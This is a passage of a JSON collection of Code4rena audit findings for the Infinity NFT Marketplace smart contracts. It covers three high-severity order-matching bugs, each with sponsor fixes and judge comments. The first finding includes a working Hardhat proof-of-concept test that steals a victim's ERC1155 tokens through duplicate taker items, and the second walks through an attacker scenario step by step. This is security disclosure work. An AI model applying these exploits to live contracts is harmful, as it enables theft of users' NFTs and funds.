// signers\n    signers = await ethers.getSigners();\n    dev = signers[0];\n    matchExecutor = signers[1];\n    victim = signers[2];\n    hacker = signers[3];\n    // token\n    token = await deployContract('MockERC20', await ethers.getContractFactory('MockERC20'), signers[0]);\n\n    // NFT constracts (ERC1155)\n    mock1155Contract1 = await deployContract('MockERC1155', await ethers.getContractFactory('MockERC1155'), dev, [\n      'uri1'\n    ]);\n    mock1155Contract2 = await deployContract('MockERC1155', await ethers.getContractFactory('MockERC1155'), dev, [\n      'uri2'\n    ]);\n\n    // Exchange\n    infinityExchange = await deployContract(\n      'InfinityExchange',\n      await ethers.getContractFactory('InfinityExchange'),\n      dev,\n      [token.address, matchExecutor.address]\n    );\n\n    // OB complication\n    obComplication = await deployContract(\n      'InfinityOrderBookComplication',\n      await ethers.getContractFactory('InfinityOrderBookComplication'),\n      dev\n    );\n\n    // add currencies to registry\n    await infinityExchange.addCurrency(token.address);\n    await infinityExchange.addCurrency(NULL_ADDRESS);\n\n    // add complications to registry\n    await infinityExchange.addComplication(obComplication.address);\n\n    // send assets\n    await token.transfer(victim.address, INITIAL_SUPPLY.div(4).toString());\n    await token.transfer(hacker.address, INITIAL_SUPPLY.div(4).toString());\n    for (let i = 0; i < numNFTsToTransfer; i++) {\n      await mock1155Contract1.mint(victim.address, i, 50, '0x');\n      await mock1155Contract2.mint(victim.address, i, 50, '0x');\n    }\n  });\n\n  describe('StealERC1155ByDuplicateItems', () => {\n    it('Passed test denotes successful hack', async function () {\n      // prepare order\n      const user = {\n        address: victim.address\n      };\n      const chainId = network.config.chainId ?? 31337;\n      const nfts = [\n        {\n          collection: mock1155Contract1.address,\n          tokens: [{ tokenId: 0, numTokens: 1 }]\n        },\n        {\n          collection: mock1155Contract2.address,\n          tokens: [{ tokenId: 0, numTokens: 1 }]\n        }\n      ];\n      const execParams = { complicationAddress: obComplication.address, currencyAddress: token.address };\n      const extraParams = {};\n      const nonce = ++orderNonce;\n      const orderId = ethers.utils.solidityKeccak256(['address', 'uint256', 'uint256'], [user.address, nonce, chainId]);\n      let numItems = 0;\n      for (const nft of nfts) {\n        numItems += nft.tokens.length;\n      }\n      const order = {\n        id: orderId,\n        chainId,\n        isSellOrder: true,\n        signerAddress: user.address,\n        numItems,\n        startPrice: ethers.utils.parseEther('1'),\n        endPrice: ethers.utils.parseEther('1'),\n        startTime: nowSeconds(),\n        endTime: nowSeconds().add(10 * 60),\n        nonce,\n        nfts,\n        execParams,\n        extraParams\n      };\n      const sellOrder = await prepare1155OBOrder(user, chainId, victim, order, infinityExchange);\n      expect(sellOrder).to.not.be.undefined;\n\n      // form matching nfts\n      const nfts_ = [\n        {\n          collection: mock1155Contract1.address,\n          tokens: [{ tokenId: 0, numTokens: 1 }]\n        },\n        {\n          collection: mock1155Contract1.address,\n          tokens: [{ tokenId: 0, numTokens: 1 }]\n        }\n      ];\n\n      // approve currency\n      let salePrice = getCurrentSignedOrderPrice(sellOrder);\n      await approveERC20(hacker.address, token.address, salePrice, hacker, infinityExchange.address);\n\n      // perform exchange\n      await infinityExchange.connect(hacker).takeOrders([sellOrder], [nfts_]);\n\n      // owners after sale\n      // XXX: note that the user's intention is to send mock1155Contract1 x 1 + mock1155Contract2 x 1\n      // When mock1155Contract1 is much more expensive than mock1155Contract2, user suffers from huge loss\n      expect(await mock1155Contract1.balanceOf(hacker.address, 0)).to.equal(2);\n    });\n  });\n});\n```\n\nAnd run\n\n```bash\n$ npx hardhat test --grep PoC\n\n  PoC\n    StealERC1155ByDuplicateItems\n      âœ“ Passed test denotes successful hack\n```\n\nNote that the passed test denotes a successful hack.\n\n### Recommended Mitigation Steps\n\nI would suggest a more gas-consuming approach by hashing all the items and putting them into a list. Then checking whether the lists match.\n\n\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/12#issuecomment-1162897771):**\n > Fixed in https://github.com/infinitydotxyz/exchange-contracts-v2/commit/bbbd362f18a2bb1992620a76e59621132b8a3d8c.\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/12#issuecomment-1179560900):**\n> This is a High risk issue. The PoC demonstrates how a maker specifying a bundle of NFTs could incorrectly have one ERC1155 item in that bundle processed several times by the taker - the bundle is not fully accepted as expected, the item processed multiple times is essentially overfilled, and this may be abused to the taker's advantage when the NFTs are not valued the same.\n\n\n\n***\n\n",
      "summary": "\nThis bug report details a vulnerability in the InfinityExchange and InfinityOrderBookComplication contracts. The bug allows hackers to violate user-defined orders by providing a 'sellOrder' with multiple tokens from different ERC1155 collections in a single order. The flaw is in the logic of 'canExecTakeOrder' and 'canExecMatchOneToMany' which do not take into account duplicated items in the 'takerItems'. This could allow a hacker to pay for a single order, but receive multiple tokens from the most expensive collection. This can lead to a user suffering a huge loss. \n\nThe proof of concept code was tested with Hardhat and confirmed the vulnerability. Manual inspection was used as the tool. \n\nThe recommended mitigation step is to use a more gas-consuming approach by hashing all the items and putting them into a list. Then checking whether the lists match.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/12",
      "tags": [],
      "finders": [
        "0xsanson",
        "k",
        "throttle",
        "zzzitron",
        "hyh",
        "PwnedNoMore"
      ]
    },
    {
      "id": "2768",
      "title": "[H-02] Loss of funds in `matchOneToManyOrders()` and `takeOrders()` and `matchOrders()` because code don't check that different ids in one collection are different, so it's possible to sell one id multiple time instead of selling multiple id one time in one collection of order (lack of checks in `doTokenIdsIntersect()` especially for ERC1155 tokens)",
      "impact": "HIGH",
      "content": "_Submitted by unforgiven_\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L271-L312>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L59-L116>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L245-L294>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L118-L143>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L330-L364>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L934-L951>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L145-L164>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L171-L243>\n\n### Impact\n\nFunction `matchOneToManyOrders()` and `takeOrders()` and `matchOrders()` suppose to match `sell order` to `buy order` and should perform some checks to ensure that user specified parameters in orders which are signed are not violated when order matching happens. but There is no check in their execution flow to check that an `order` has different `NFT token ids` in each one of it's collections, so even so number of tokens could be valid in `order` to `order` transfer but the number of real transferred tokens and their IDs can be different than what user specified and signed. and user funds would be lost. (because of `ERC1155` there can be more than one token for a `tokenId`, so it would be possible to transfer it)\n\n### Proof of Concept\n\nThis is `_takeOrders()` and `and` code:\n\n      /**\n       * @notice Internal helper function to take orders\n       * @dev verifies whether order can be executed\n       * @param makerOrder the maker order\n       * @param takerItems nfts to be transferred\n       * @param execPrice execution price\n       */\n      function _takeOrders(\n        OrderTypes.MakerOrder calldata makerOrder,\n        OrderTypes.OrderItem[] calldata takerItems,\n        uint256 execPrice\n      ) internal {\n        bytes32 makerOrderHash = _hash(makerOrder);\n        bool makerOrderValid = isOrderValid(makerOrder, makerOrderHash);\n        bool executionValid = IComplication(makerOrder.execParams[0]).canExecTakeOrder(makerOrder, takerItems);\n        require(makerOrderValid && executionValid, 'order not verified');\n        _execTakeOrders(makerOrderHash, makerOrder, takerItems, makerOrder.isSellOrder, execPrice);\n      }\n\nAs you can see it uses `canExecTakeOrder()` to check that it is valid to perform matching. This is `canExecTakeOrder()` and `areTakerNumItemsValid()` and `doTokenIdsIntersect()` code which are used in execution flow to check orders and matching validity:\n\n      /**\n       * @notice Checks whether take orders with a higher order intent can be executed\n       * @dev This function is called by the main exchange to check whether take orders with a higher order intent can be executed.\n              It checks whether orders have the right constraints - i.e they have the right number of items, whether time is still valid\n              and whether the nfts intersect\n       * @param makerOrder the maker order\n       * @param takerItems the taker items specified by the taker\n       * @return returns whether order can be executed\n       */\n      function canExecTakeOrder(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems)\n        external\n        view\n        override\n        returns (bool)\n      {\n        return (makerOrder.constraints[3] <= block.timestamp &&\n          makerOrder.constraints[4] >= block.timestamp &&\n          areTakerNumItemsValid(makerOrder, takerItems) &&\n          doItemsIntersect(makerOrder.nfts, takerItems));\n      }\n\n      /// @dev sanity check to make sure that a taker is specifying the right number of items\n      function areTakerNumItemsValid(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems)\n        public\n        pure\n        returns (bool)\n      {\n        uint256 numTakerItems = 0;\n        uint256 nftsLength = takerItems.length;\n        for (uint256 i = 0; i < nftsLength; ) {\n          unchecked {\n            numTakerItems += takerItems[i].tokens.length;\n            ++i;\n          }\n        }\n        return makerOrder.constraints[0] == numTakerItems;\n      }\n\n      /**\n       * @notice Checks whether tokenIds intersect\n       * @dev This function checks whether there are intersecting tokenIds between two order items\n       * @param item1 first item\n       * @param item2 second item\n       * @return returns whether tokenIds intersect\n       */\n      function doTokenIdsIntersect(OrderTypes.OrderItem calldata item1, OrderTypes.OrderItem calldata item2)\n        public\n        pure\n        returns (bool)\n      {\n        uint256 item1TokensLength = item1.tokens.length;\n        uint256 item2TokensLength = item2.tokens.length;\n        // case where maker/taker didn't specify any tokenIds for this collection\n        if (item1TokensLength == 0 || item2TokensLength == 0) {\n          return true;\n        }\n        uint256 numTokenIdsPerCollMatched = 0;\n        for (uint256 k = 0; k < item2TokensLength; ) {\n          for (uint256 l = 0; l < item1TokensLength; ) {\n            if (\n              item1.tokens[l].tokenId == item2.tokens[k].tokenId && item1.tokens[l].numTokens == item2.tokens[k].numTokens\n            ) {\n              // increment numTokenIdsPerCollMatched\n              unchecked {\n                ++numTokenIdsPerCollMatched;\n              }\n              // short circuit\n              break;\n            }\n            unchecked {\n              ++l;\n            }\n          }\n          unchecked {\n            ++k;\n          }\n        }\n\n        return numTokenIdsPerCollMatched == item2TokensLength;\n      }\n\nAs you can see there is no logic to check that `token IDs` in one collection of order are different and code only checks that total number of tokens in one `order` matches the number of tokens specified and the ids in one order exists in other list defined. function `doTokenIdsIntersect()` checks to see that `tokens ids` in one collection can match list of specified tokens. because of this check lacking there are some scenarios that can cause fund lose for `ERC1155` tokens (normal `ERC721` requires more strange conditions). here is first example:\n\n1.  For simplicity, let's assume collection and timestamp are valid and match for orders and token is `ERC1155`\n2.  `user1` has signed this order: A:`(user1 BUY 3 NFT IDs[(1,1),(2,1),(3,1)] at 15 ETH)` (buy `1` token of each `id=1,2,3`)\n3.  `NFT ID[1]` fair price is `1 ETH`, `NFT ID[2]` fair price is `2 ETH`, `NFT ID[3]` fair price is `12 ETH`\n4.  `attacker` who has 3 of `NFT ID[1]` create this list: B:`(NFT IDs[(1,1), (1,1), (1,1)] )` (list to trade `1`token of `id=1` for 3 times)\n5.  Attacker call `takeOrders()` with this parameters: makerOrder: A , takerNfts: B\n6.  Contract logic would check all the conditions and validate and verify orders and their matching (they intersect and total number of token to sell is equal to total number of tokens to buy and all of the B list is inside A list) and perform the transaction.\n7.  `attacker` would receive `15 ETH` for his 3 token of `NFT ID[1]` and steal `user1` funds. `user1` would receive 3 of `NFT ID[1]` and pays `15 ETH` and even so his order A has been executed he doesn't receive `NFT IDs[(2,1),(3,1)]` and contract would violates his signed parameters.\n\nThis examples shows that in verifying one to many order code should verify that one order's one  collection's token ids are not duplicates. (the function `doTokenIdsIntersect()` doesn't check for this).\n\nThis scenario is performable to `matchOneToManyOrders()` and `matchOrders()` and but exists in their code (related check logics) too. more important things about this scenario is that it doesn't require off-chain maching engine to make mistake or malicious act, anyone can call `takeOrders()` if NFT tokens are `ERC1155`. for other `NFT` tokens to perform this attack it requires that `seller==buyer` or some other strange cases (like auto selling when receiving in one contract).\n\n### Tools Used\n\nVIM\n\n### Recommended Mitigation Steps\n\nAdd checks to ensure `order`'s one `collection`'s token ids are not duplicate in `doTokenIdsIntersect()`\n\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/135#issuecomment-1162878540):**\n > Agree with assessment. Fixed. https://github.com/infinitydotxyz/exchange-contracts-v2/commit/c3c0684ac02e0cf1c03cdbee7e68c5a37fa334a8 and removed support for ERC1155\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/135#issuecomment-1179823515):**\n > This is an interesting scenario where the same NFT appears multiple times in a match and results in one order being under filled, leading to potential losses for the user. And the attack does not depend on the matching engine. Agree this is High risk.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of a project called Infinity. This project is a decentralized exchange for trading Non-Fungible Tokens (NFTs). The bug is in the code of the function `matchOneToManyOrders()` and `takeOrders()` and `matchOrders()` which are used to match \"sell order\" to \"buy order\" and should perform some checks to ensure that user specified parameters in orders which are signed are not violated when order matching happens. The problem is that there is no check in the code to verify that an order has different Non-Fungible Token (NFT) ids in each of its collections. This means that it is possible for a user to transfer the wrong tokens and lose funds.\n\nTo exploit this vulnerability, an attacker could create a list of tokens to trade (B) with the same NFT id but different numbers of tokens. They could then call the `takeOrders()` function with this list and the user's order (A). The code does not check that the NFT ids in the order are different, so the attacker would receive the funds from the user's order for the same NFT id but different numbers of tokens. The user would receive the wrong tokens and lose funds.\n\nThe recommended mitigation step is to add checks to the code to ensure that the order's one collection's token ids are not duplicates in the `doTokenIdsIntersect()` function. This would help to prevent attackers from exploiting the vulnerability.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/135",
      "tags": [
        "ERC1155"
      ],
      "finders": [
        "unforgiven"
      ]
    },
    {
      "id": "2767",
      "title": "[H-01] Maker buy order with no specified NFT tokenIds may get fulfilled in `matchOneToManyOrders` without receiving any NFT",
      "impact": "HIGH",
      "content": "_Submitted by WatchPug, also found by 0xsanson, PwnedNoMore, and unforgiven_\n\nThe call stack: matchOneToManyOrders() -> \\_matchOneMakerSellToManyMakerBuys() -> \\_execMatchOneMakerSellToManyMakerBuys() -> \\_execMatchOneToManyOrders() -> \\_transferMultipleNFTs()\n\nBased on the context, a maker buy order can set `OrderItem.tokens` as an empty array to indicate that they can accept any tokenId in this collection, in that case, `InfinityOrderBookComplication.doTokenIdsIntersect()` will always return `true`.\n\nHowever, when the system matching a sell order with many buy orders, the `InfinityOrderBookComplication` contract only ensures that the specified tokenIds intersect with the sell order, and the total count of specified tokenIds equals the sell order's quantity (`makerOrder.constraints[0]`).\n\nThis allows any maker buy order with same collection and `empty tokenIds` to be added to `manyMakerOrders` as long as there is another maker buy order with specified tokenIds that matched the sell order's tokenIds.\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L68-L116>\n\n```solidity\nfunction canExecMatchOneToMany(\n    OrderTypes.MakerOrder calldata makerOrder,\n    OrderTypes.MakerOrder[] calldata manyMakerOrders\n  ) external view override returns (bool) {\n    uint256 numItems;\n    bool isOrdersTimeValid = true;\n    bool itemsIntersect = true;\n    uint256 ordersLength = manyMakerOrders.length;\n    for (uint256 i = 0; i < ordersLength; ) {\n      if (!isOrdersTimeValid || !itemsIntersect) {\n        return false; // short circuit\n      }\n\n      uint256 nftsLength = manyMakerOrders[i].nfts.length;\n      for (uint256 j = 0; j < nftsLength; ) {\n        numItems += manyMakerOrders[i].nfts[j].tokens.length;\n        unchecked {\n          ++j;\n        }\n      }\n\n      isOrdersTimeValid =\n        isOrdersTimeValid &&\n        manyMakerOrders[i].constraints[3] <= block.timestamp &&\n        manyMakerOrders[i].constraints[4] >= block.timestamp;\n\n      itemsIntersect = itemsIntersect && doItemsIntersect(makerOrder.nfts, manyMakerOrders[i].nfts);\n\n      unchecked {\n        ++i;\n      }\n    }\n\n    bool _isTimeValid = isOrdersTimeValid &&\n      makerOrder.constraints[3] <= block.timestamp &&\n      makerOrder.constraints[4] >= block.timestamp;\n\n    uint256 currentMakerOrderPrice = _getCurrentPrice(makerOrder);\n    uint256 sumCurrentOrderPrices = _sumCurrentPrices(manyMakerOrders);\n\n    bool _isPriceValid = false;\n    if (makerOrder.isSellOrder) {\n      _isPriceValid = sumCurrentOrderPrices >= currentMakerOrderPrice;\n    } else {\n      _isPriceValid = sumCurrentOrderPrices <= currentMakerOrderPrice;\n    }\n\n    return (numItems == makerOrder.constraints[0]) && _isTimeValid && itemsIntersect && _isPriceValid;\n  }\n```\n\nHowever, because `buy.nfts` is used as `OrderItem` to transfer the nfts from seller to buyer, and there are no tokenIds specified in the matched maker buy order, the buyer wont receive any nft (`_transferERC721s` does nothing, 0 transfers) despite the buyer paid full in price.\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L763-L786>\n\n```solidity\nfunction _execMatchOneMakerSellToManyMakerBuys(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    uint256 startGasPerOrder,\n    uint256 execPrice,\n    uint16 protocolFeeBps,\n    uint32 wethTransferGasUnits,\n    address weth\n  ) internal {\n    isUserOrderNonceExecutedOrCancelled[buy.signer][buy.constraints[5]] = true;\n    uint256 protocolFee = (protocolFeeBps * execPrice) / 10000;\n    uint256 remainingAmount = execPrice - protocolFee;\n    _execMatchOneToManyOrders(sell.signer, buy.signer, buy.nfts, buy.execParams[1], remainingAmount);\n    _emitMatchEvent(\n      sellOrderHash,\n      buyOrderHash,\n      sell.signer,\n      buy.signer,\n      buy.execParams[0],\n      buy.execParams[1],\n      execPrice\n    );\n```\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1080-L1092>\n\n```solidity\nfunction _transferERC721s(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    uint256 numTokens = item.tokens.length;\n    for (uint256 i = 0; i < numTokens; ) {\n      IERC721(item.collection).safeTransferFrom(from, to, item.tokens[i].tokenId);\n      unchecked {\n        ++i;\n      }\n    }\n  }\n```\n\n### Proof of Concept\n\n1.  Alice signed and submitted a maker buy order #1, to buy `2` Punk with `2 WETH` and specified tokenIds = `1`,`2`\n2.  Bob signed and submitted a maker buy order #2, to buy `1` Punk with `1 WETH` and with no specified tokenIds.\n3.  Charlie signed and submitted a maker sell order #3, ask for `3 WETH` for `2` Punk and specified tokenIds = `1`,`2`\n4.  The match executor called `matchOneToManyOrders()` match Charlie's sell order #3 with buy order #1 and #2, Alice received `2` Punk, Charlie received `3 WETH`, Bob paid `1 WETH` and get nothing in return.\n\n### Recommendation\n\nChange to:\n\n```solidity\nfunction canExecMatchOneToMany(\n    OrderTypes.MakerOrder calldata makerOrder,\n    OrderTypes.MakerOrder[] calldata manyMakerOrders\n  ) external view override returns (bool) {\n    uint256 numItems;\n    uint256 numConstructedItems;\n    bool isOrdersTimeValid = true;\n    bool itemsIntersect = true;\n    uint256 ordersLength = manyMakerOrders.length;\n    for (uint256 i = 0; i < ordersLength; ) {\n      if (!isOrdersTimeValid || !itemsIntersect) {\n        return false; // short circuit\n      }\n\n      numConstructedItems += manyMakerOrders[i].constraints[0];\n\n      uint256 nftsLength = manyMakerOrders[i].nfts.length;\n      for (uint256 j = 0; j < nftsLength; ) {\n        numItems += manyMakerOrders[i].nfts[j].tokens.length;\n        unchecked {\n          ++j;\n        }\n      }\n\n      isOrdersTimeValid =\n        isOrdersTimeValid &&\n        manyMakerOrders[i].constraints[3] <= block.timestamp &&\n        manyMakerOrders[i].constraints[4] >= block.timestamp;\n\n      itemsIntersect = itemsIntersect && doItemsIntersect(makerOrder.nfts, manyMakerOrders[i].nfts);\n\n      unchecked {\n        ++i;\n      }\n    }\n\n    bool _isTimeValid = isOrdersTimeValid &&\n      makerOrder.constraints[3] <= block.timestamp &&\n      makerOrder.constraints[4] >= block.timestamp;\n\n    uint256 currentMakerOrderPrice = _getCurrentPrice(makerOrder);\n    uint256 sumCurrentOrderPrices = _sumCurrentPrices(manyMakerOrders);\n\n    bool _isPriceValid = false;\n    if (makerOrder.isSellOrder) {\n      _isPriceValid = sumCurrentOrderPrices >= currentMakerOrderPrice;\n    } else {\n      _isPriceValid = sumCurrentOrderPrices <= currentMakerOrderPrice;\n    }\n\n    return (numItems == makerOrder.constraints[0]) && (numConstructedItems == numItems) && _isTimeValid && itemsIntersect && _isPriceValid;\n  }\n```\n\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/254#issuecomment-1162958056):**\n> Fixed in https://github.com/infinitydotxyz/exchange-contracts-v2/commit/7f0e195d52165853281b971b8610b27140da6e41\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/254#issuecomment-1179552380):**\n > Confirmed the scenario as described.\n> \n> Buyers specifying just a collection and no specific tokens is a basically a floor sweep which has become common for NFTs. In this scenario, the warden shows how a buyer can end up spending money and get nothing in return. This is a High risk issue.\n> \n> Issue [#314](https://github.com/code-423n4/2022-06-infinity-findings/issues/314) is very similar but flips the impact to explore how a seller's offer could be attacked and how it applies to an allow list of tokenIds. (It has been grouped with H-01)\n\n\n\n***\n\n",
      "summary": "\nA bug report has been identified in the code for the InfinityOrderBookComplication contract. This bug can cause a buyer to pay full price for a Non-Fungible Token (NFT) but not receive the item.\n\nThe call stack for this bug is matchOneToManyOrders() -> _matchOneMakerSellToManyMakerBuys() -> _execMatchOneMakerSellToManyMakerBuys() -> _execMatchOneToManyOrders() -> _transferMultipleNFTs().\n\nThe bug occurs when a maker buy order sets OrderItem.tokens as an empty array. This indicates that the buyer can accept any tokenId in the collection. When the system is matching a sell order with many buy orders, the InfinityOrderBookComplication contract only ensures that the specified tokenIds intersect with the sell order and the total count of specified tokenIds equals the sell order's quantity (makerOrder.constraints[0]).\n\nThis allows any maker buy order with same collection and empty tokenIds to be added to manyMakerOrders as long as there is another maker buy order with specified tokenIds that matched the sell order's tokenIds. However, because buy.nfts is used as OrderItem to transfer the nfts from seller to buyer, and there are no tokenIds specified in the matched maker buy order, the buyer wont receive any nft (_transferERC721s does nothing, 0 transfers) despite the buyer paid full in price.\n\nA Proof of Concept (PoC) has been provided to demonstrate the bug. This PoC involves Alice, Bob, and Charlie. Alice signed and submitted a maker buy order #1, to buy 2 Punk with 2 WETH and specified tokenIds = 1,2. Bob signed and submitted a maker buy order #2, to buy 1 Punk with 1 WETH and with no specified tokenIds. Charlie signed and submitted a maker sell order #3, ask for 3 WETH for 2 Punk and specified tokenIds = 1,2. The match executor called matchOneToManyOrders() match Charlie's sell order #3 with buy order #1 and #2, Alice received 2 Punk, Charlie received 3 WETH, Bob paid 1 WETH and get nothing in return.\n\nThe recommendation for fixing this bug is to change the code in the canExecMatchOneToMany",
      "quality_score": 5,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/254",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "WatchPug",
        "unforgiven",
        "PwnedNoMore",
        "0xsanson"
      ]
    }
  ]
}